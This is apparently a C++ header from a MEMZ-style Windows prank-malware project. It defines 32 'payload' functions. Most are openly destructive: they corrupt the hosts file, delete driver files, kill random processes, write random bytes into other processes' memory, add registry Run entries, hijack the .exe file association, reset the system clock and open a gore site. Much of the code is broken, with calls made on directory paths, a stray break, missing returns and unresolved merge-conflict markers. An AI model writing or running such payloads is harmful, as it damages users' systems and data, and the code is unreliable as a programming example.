#pragma once
#define fori(x) for (INT i = 0; i < x; i++)
#define whiletrue while (true)

int rickroll() {
    ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_HIDE);

    // youtube.com/dQw4w9WgXcQ
    return 0;
}

int p1()
{ //msgbox
    MSGBOXPARAMS msg2 = {0};
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
    msg2.lpszCaption = "Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);

    MSGBOXPARAMS msg1 = {0};
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = "Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);

    return 0;
}

int p2()
{ //memz final payload but random
    fori(50)
    {

        //msgbox spam
        DWORD dwID = 0;
        MSGBOXPARAMS msg = {0};
        msg.cbSize = sizeof(MSGBOXPARAMS);
        msg.hwndOwner = NULL;
        msg.hInstance = GetModuleHandle(NULL);
        msg.lpszText = "bet you regret that now huh";
        msg.lpszCaption = "ez";
        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);

        HWND desktop = GetDesktopWindow();
        HDC desk = GetDC(NULL);
        RECT rect;
        GetWindowRect(desktop, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
        Sleep(300 - (4 * i));
        TextOutA(desk, 100, 100, "Hey look its ur screen down below", 33);
        StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);

        HRGN hRegion1;
        hRegion1 = CreateRectRgn(0, 0, w, h);
        InvertRgn(desk, hRegion1);

        Beep(rand() % 30000, rand() % 1000);
    }
    return 0;
}

int p3()
{
    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    INT w = rect.right - rect.left;
    INT h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

    INT sw = GetSystemMetrics(SM_CXSCREEN);
    INT sh = GetSystemMetrics(SM_CYSCREEN);
    SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

    for (INT index = 0; index < 100; index++)
    {
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
    }

    return 0;
}

//Corrupt the registry
int p4()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "Xytharis", 0, REG_SZ, (BYTE *)"C:\\Windows\\System32\\cmd.exe", strlen("C:\\Windows\\System32\\cmd.exe"));
    RegCloseKey(hKey);
    return 0;
}

//Corrupt the file system
int p5()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now", L":thinking:", MB_OK | MB_ICONHAND);
    fori(100)
    {
        HANDLE hFile = CreateFileA("C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }
        DWORD dwSize = GetFileSize(hFile, NULL);
        if (dwSize == INVALID_FILE_SIZE)
        {
            break;
        }
        LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        DWORD dwBytesRead = 0;
        if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer2 == NULL)
        {
            break;
        }
        memcpy(lpBuffer2, lpBuffer, dwSize);
        fori(dwSize)
        {
            if (i % 2 == 0)
            {
                ((LPBYTE)lpBuffer2)[i] = rand() % 255;
            }
        }
        if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        VirtualFree(lpBuffer2, 0, MEM_RELEASE);
        CloseHandle(hFile);
    }
}

//Corrupt current memory
int p6()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONHAND);
    fori(100)
    {
        LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        fori(0x1000)
        {
            ((LPBYTE)lpBuffer)[i] = rand() % 255;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
    }
}

//Delete all files on Desktop
int p7()
{
    fori(100)
    {
        HANDLE hFile = CreateFileA("C:\\Users\\Public\\Desktop\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }
        DWORD dwSize = GetFileSize(hFile, NULL);
        if (dwSize == INVALID_FILE_SIZE)
        {
            break;
        }
        LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        DWORD dwBytesRead = 0;
        if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer2 == NULL)
        {
            break;
        }
        memcpy(lpBuffer2, lpBuffer, dwSize);
        fori(dwSize)
        {
            if (i % 2 == 0)
            {
                ((LPBYTE)lpBuffer2)[i] = rand() % 255;
            }
        }
        if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        VirtualFree(lpBuffer2, 0, MEM_RELEASE);
        CloseHandle(hFile);
    }
}

//Terminate random running processes
int p8()
{ 
    fori(100)
    {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, rand() % 100);
        if (hProcess == NULL)
        {
            break;
        }
        TerminateProcess(hProcess, 0);
    }
}

//Leak Memory
int p9()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    fori(100)
    {
        LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
    }
}

//Hog all available memory
int p10()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    fori(5000)
    {
        LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
    }
}

//Fill up the entire hard drive
int p11()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    fori(100)
    {
        std::ostream file("fill");
        fori(0x100000)
        {
            file << "lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll";
        }
        file.close();
        HANDLE hFile = CreateFileA("C:\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }
        DWORD dwSize = GetFileSize(hFile, NULL);
        if (dwSize == INVALID_FILE_SIZE)
        {
            break;
        }
        LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        DWORD dwBytesRead = 0;
        if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer2 == NULL)
        {
            break;
        }
        memcpy(lpBuffer2, lpBuffer, dwSize);
        fori(dwSize)
        {
            if (i % 2 == 0)
            {
                ((LPBYTE)lpBuffer2)[i] = rand() % 255;
            }
        }
        if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        VirtualFree(lpBuffer2, 0, MEM_RELEASE);
        CloseHandle(hFile);
    }
}

//Open random system programs
int p12()
{
    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
    fori(100)
    {
        HANDLE hFile = CreateFileA("C:\\Windows\\System32\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }
        DWORD dwSize = GetFileSize(hFile, NULL);
        if (dwSize == INVALID_FILE_SIZE)
        {
            break;
        }
        LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        DWORD dwBytesRead = 0;
        if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer2 == NULL)
        {
            break;
        }
        memcpy(lpBuffer2, lpBuffer, dwSize);
        fori(dwSize)
        {
            if (i % 2 == 0)
            {
                ((LPBYTE)lpBuffer2)[i] = rand() % 255;
            }
        }
        if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
        {
            break;
        }
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
        VirtualFree(lpBuffer2, 0, MEM_RELEASE);
        CloseHandle(hFile);
    }
}

// Open a website
int p13() 
{
    MessageBoxW(NULL, L"sub 2 kevlu8", L"do it or i kill ur pc", MB_OK | MB_ICONINFORMATION);
    fori(100)
    {
        LPCSTR urls[] = {
            "https://kevlu8.herokuapp.com",
            "https://www.reddit.com/r/eyeblech",
            "https://www.youtube.com/kevlu8",
            "https://www.github.com/kevlu8",
            "https://www.github.com/kevlu8/Xytharis",
            "https://www.torproject.org/download/",
            "https://www.discord.gg/nhzXNNS",
            "https://www.twitter.com/kevlu8wastaken",
            "https://www.instagram.com",
            "https://www.facebook.com/",
            "https://web.archive.org/web/20210620035058/reddit.com/r/nonewnormal/",
            "https://www.roblox.com",
            "https://www.youareanidiot.org",
            "https://www.twitter.com/dreamwastaken",
            "https://www.youtube.com/channel/UCsiysQAqUGTLsk04k_BVowQ"
        }
        Sleep(rand() % 10000);
        ShellExecuteA(NULL, "open", urls[rand() % 14], NULL, NULL, SW_HIDE);
    }
}

// Trap
int p14() 
{
    if (MessageBoxW(NULL, L"You know what? I'm tired. Let's end this.", L"Trade offer", MB_YESNO | MB_ICONINFORMATION) == ID_YES)
    {
        MessageBoxW(NULL, L"I'm sorry, but I can't let you do that.", L"Trade offer", MB_OK | MB_ICONHAND);

        fori(70) {
            BitBlt(GetDC(NULL), 0, 0, 0, 0, GetDC(NULL), 0, 0, 0x00CC0020);
            Sleep(rand() % 100);
        }

        RtlMoveMemory(GetCommandLineA(), "", 0);

        ShellExecuteA(NULL, NULL, "\\\\.\\GLOBALROOT\\ConDrv\\Device\\KernelConnect", NULL, NULL, SW_HIDE);
    }
    
}

// Put "Your Mom" on the screen as text
int p15() 
{
    fori(500)
    {
        Sleep(rand() % 100);
        HDC hdc = GetDC(NULL);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        switch (i % 5) {
            case 0:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "Your Mom", 9);
                break;
            case 1:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ur mom", 7);
                break;
            case 2:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "bjormom", 8);
                break;  
            case 3:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "so bad", 6);
                break;
            default:
                TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ha", 3);
                break;
        }
        ReleaseDC(NULL, hdc);
    }
}

// Play randomly generated audio
int p16() //TODO fix
{
    whiletrue
    {
        Sleep(rand() % 100);
        PlaySound(NULL, NULL, SND_ASYNC | SND_MEMORY);
        LPSTR lpBuffer = (LPSTR)VirtualAlloc(NULL, 0x10000, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        fori(0x10000)
        {
            lpBuffer[i] = rand() % 255;
        }
        PlaySoundA(lpBuffer, NULL, SND_ASYNC | SND_MEMORY);
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
<<<<<<< HEAD
    }
}

// Put a random image on the screen
int p17() 
{
    fori(50)
    {
        Sleep(rand() % 100);
        HDC hdc = GetDC(NULL);
        HBITMAP hBitmap = LoadBitmapA(NULL, MAKEINTRESOURCEA(rand() % 1000));
        if (hBitmap == NULL)
        {
            break;
        }
        BITMAP bm;
        GetObject(hBitmap, sizeof(BITMAP), &bm);
        HDC hdcMem = CreateCompatibleDC(hdc);
        SelectObject(hdcMem, hBitmap);
        BitBlt(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
        DeleteDC(hdcMem);
        DeleteObject(hBitmap);
        ReleaseDC(NULL, hdc);
    }
}

// Change screen resolution
int p18() 
{
    fori(50)
    {
        Sleep(rand() % 60000);
        ChangeDisplaySettingsA(NULL, 0);
        DEVMODE dm;
        dm.dmSize = sizeof(DEVMODE);
        dm.dmPelsWidth = rand() % GetSystemMetrics(SM_CXSCREEN);
        dm.dmPelsHeight = rand() % GetSystemMetrics(SM_CYSCREEN);
        dm.dmBitsPerPel = rand() % 32;
        dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT | DM_BITSPERPEL;
        ChangeDisplaySettingsA(&dm, CDS_FULLSCREEN);
    }
}

// Change the mouse cursor
int p19() 
{
    fori(50)
    {
        Sleep(rand() % 10000);
        SetCursor(LoadCursorA(NULL, MAKEINTRESOURCEA(rand() % 1000)));
    }
}

// Change the keyboard layout
int p20() 
{
    fori(50)
    {
        Sleep(rand() % 10000);
        LoadKeyboardLayoutA(MAKEINTRESOURCEA(rand() % 1000), 0);
    }
}

// Make the keyboard type random characters
int p21() 
{
    fori(50)
    {
        Sleep(rand() % 10000);
        fori(rand() % 100)
        {
            keybd_event(rand() % 255, rand() % 255, rand() % 2, 0);
        }
    }
}

// Make the mouse move and click randomly
int p22() // Must do in thread
{
    whiletrue
    {
        Sleep(rand() % 50);
        mouse_event(rand() % 3, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN));
        mouse_event(rand() % 3, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN));
    }
}

// Corrupt random programs
int p23() 
{
    fori(50)
    {
        Sleep(rand() % 5000);
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, rand() % 0xFFFF);
        if (hProcess == NULL)
        {
            break;
        }
        DWORD dwSize = 0x10000;
        LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
        if (lpBuffer == NULL)
        {
            break;
        }
        fori(0x10000)
        {
            char c = rand() % 255;
            if (c == 0)
            {
                c = 1;
            }
            WriteProcessMemory(hProcess, (LPVOID)((DWORD)lpBuffer + i), &c, 1, NULL);
        }
        VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
    }
}

// Randomly delete drivers
int p24() 
{
    fori(50)
    {
        Sleep(rand() % 5000);
        char szDriver[MAX_PATH];
        GetSystemDirectoryA(szDriver, MAX_PATH);
        strcat(szDriver, "\\drivers\\");
        strcat(szDriver, rand() % 2 ? "vmmouse.sys" : "vm3d.sys");
        DeleteFileA(szDriver);
    }
}

// Disconnect from the internet
int p25() 
{
    fori(50)
    {
        Sleep(rand() % 5000);
        InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
        InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
    }
}

// Randomly change the system time
int p26()  //MUST DO IN THREAD
{
    whiletrue
    {
        Sleep(rand() % 5000);
        SYSTEMTIME st;
        st.wYear = rand() % 0xFFFF;
        st.wMonth = rand() % 12;
        st.wDayOfWeek = rand() % 7;
        st.wDay = rand() % 31;
        st.wHour = rand() % 24;
        st.wMinute = rand() % 60;
        st.wSecond = rand() % 60;
        st.wMilliseconds = rand() % 1000;
        SetSystemTime(&st);
    }
}

// Randomly change the sound volume
int p27()  //MUST DO IN THREAD
{
    whiletrue
    {
        Sleep(rand() % 10000);
        DWORD dwVolume;
        waveOutGetVolume(NULL, &dwVolume);
        dwVolume = (rand() % 0xFFFF) | (dwVolume & 0xFFFF0000);
        waveOutSetVolume(NULL, dwVolume);
    }
}

// Color shift the screen using BitBlt
int p28() 
{
    fori(50)
    {
        Sleep(rand() % 10000);
        HDC hdc = GetDC(NULL);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
        HDC hdcMem = CreateCompatibleDC(hdc);
        SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0, SRCCOPY);
        fori(GetSystemMetrics(SM_CXSCREEN))
        {
            for (int j = 0; j < SM_CYSCREEN; j++)
            {
                COLORREF color = GetPixel(hdcMem, i, j);
                SetPixel(hdcMem, i, j, RGB(GetRValue(color) + rand() % 0xFF, GetGValue(color) + rand() % 0xFF, GetBValue(color) + rand() % 0xFF));
            }
        }
        BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdcMem, 0, 0, SRCCOPY);
        DeleteDC(hdcMem);
        DeleteObject(hBitmap);
        ReleaseDC(NULL, hdc);
    }
}

// Connect a virtual USB device
int p29() 
{
    Sleep(rand() % 10000);
    HANDLE hDevice = CreateFileA("\\\\.\\RandomUSBFile", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        break;
    }
    CloseHandle(hDevice);
}

// Randomly change the system language
int p30() 
{
    Sleep(rand() % 10000);
    SetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_ILANGUAGE, MAKEINTRESOURCEA(rand() % 1000));
}

// Randomly change the system theme
int p31() 
{
    Sleep(rand() % 10000);
    SetWindowTheme(NULL, MAKEINTRESOURCEA(rand() % 1000), NULL);
}

// Associate .exe files with this program
int p32()  //TODO: Work on later
{
    fori(50)
    {
        Sleep(rand() % 10000);
        TCHAR buffer[MAX_PATH] = { 0 };
        GetModuleFileName( NULL, buffer, MAX_PATH );
        HKEY hKey;
        RegCreateKeyExA(HKEY_CLASSES_ROOT, ".exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (LPBYTE)buffer, strlen(buffer) + 1);
        RegCloseKey(hKey);
    }
}

//32 payloads. I'm done for the day!
=======
    }}
>>>>>>> 058e6a50acff2a3d75557520d2882a3effd0d72e
